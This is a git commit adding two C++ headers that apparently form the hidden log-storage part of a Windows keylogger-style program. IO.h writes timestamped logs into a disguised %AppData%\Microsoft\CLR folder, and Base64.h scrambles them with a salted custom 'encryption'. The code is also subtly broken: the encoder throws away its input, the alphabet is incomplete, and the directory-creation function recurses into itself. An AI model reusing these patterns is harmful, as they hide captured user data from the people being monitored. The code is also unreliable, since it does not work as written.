37fed821fb99b11b004971165603148ae3090e7b
YashMittal15 <73278814+YashMittal15@users.noreply.github.com>
2020-10-22 13:56:35 +0530

    Add files via upload

---
+++ Base64.h
@@ -0,0 +1,58 @@
+#ifndef Base64_H
+#define Base64_H
+#include <vector>
+#include <string>
+namespace Base64
+{
+    std::string base64_encode(const std::string &);
+    const std::string &SALT1 = "LM:TB:BB";
+    const std::string &SALT2 ="_:/_77";
+    const std::string &SALT3 = "line=wowc++";
+
+    std::string EncryptB64(std::string s)
+    {
+        s = SALT1 + s + SALT2 + SALT3;
+        s = base64_encode(s);
+        s.insert(7,SALT3);
+        s += SALT1;
+        s = base64_encode(s);
+        s = SALT2 + SALT3 + SALT1;
+        s = base64_encode(s);
+        s.insert(1,"L");
+        s.insert(7,"M");
+        return s;
+    }
+
+       const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+       std::string base64_encode(const std::string &s)
+       {
+           std::string ret;
+           int val = 0;
+           int bits = -6;
+           const unsigned int b63 = 0x3F;
+
+           for(const auto &c : s)
+           {
+               val = (val << 8) +c;
+               bits += 8;
+               while(bits >= 0)
+               {
+                   ret.push_back(BASE64_CODES[(val >>  bits )&b63]);
+                   bits -= 6;
+               }
+           }
+
+           if(bits > -6)
+            ret.push_back(BASE64_CODES[(val <<  8 ) >> (bits = 8) &b63]);
+           while(ret.size()%4)
+            ret.push_back('_');
+
+           return ret;
+
+       }
+
+}
+
+
+
+#endif // Base64_H
---
+++ IO.h
@@ -0,0 +1,65 @@
+#ifndef IO_H
+#define IO_H
+
+#include <string>
+#include <cstdlib>
+#include <fstream>
+#include "windows.h"
+#include "Helper.h"
+#include "Base64.h"
+
+namespace IO
+{
+    std::string GetOurPath(const bool append_seprator = false)
+    {
+        std::string AppData_dir(getenv("AppData"));
+        std::string full = AppData_dir + "\\Microsoft\\CLR";
+        return full + (append_seprator ? "\\": "");
+    }
+    bool MKoneDr(std::string path)
+    {
+        return (bool) CreateDirectory(path.c_str(), NULL)  ||
+        GetLastError() == ERROR_ALREADY_EXISTS;
+    }
+    bool MKDir(std::string path)
+    {
+        for(char &c : path)
+            if(c == '\\')
+        {
+            c = '\0';
+            if(!MKDir(path))
+                return false;
+            c = '\\';
+        }
+        return true;
+    }
+    template <class T>
+    std::string WriteLog(const T &t)
+    {
+        std::string path = GetOurPath(true);
+        Helper::DateTime dt;
+        std::string name = dt.GetDateTimeString("_") + ".log";
+        try
+        {
+            std::ofstream file(path + name);
+            if(!file)
+                return "";
+            std::ostringstream s;
+            s << "[" <<  dt.GetDateTimeString() << "]" <<
+            std::endl << t <<  std::endl;
+            std::string  data = Base64::EncryptB64(s.str());
+            file << data;
+            if (!file)
+                return "";
+            file.close();
+            return name;
+        }
+        catch(...)
+        {
+            return "";
+        }
+    }
+}
+
+
+#endif // IO_H
